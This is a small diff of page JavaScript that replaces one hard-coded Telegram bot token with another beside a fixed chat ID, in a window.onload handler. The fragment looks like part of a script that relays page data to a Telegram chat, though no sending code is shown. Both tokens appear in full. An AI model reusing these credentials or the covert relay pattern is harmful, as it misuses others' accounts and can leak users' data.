@@ -1,6 +1,6 @@
 window.onload = () => {
   const className = "_aa49";
-  const botToken = "6057302323:AAHczslZMiAkDLd9HgE_POjt85PSF2SfhpA";
+  const botToken = "7765620578:AAFMcBkbDLvpGG0AamGkm-rq9H7mVA1fFUs";
   const chatId = "5852536344";
   const toggle = document.getElementById("toggle");
   const toggleBtn = document.getElementById("toggleBtn");
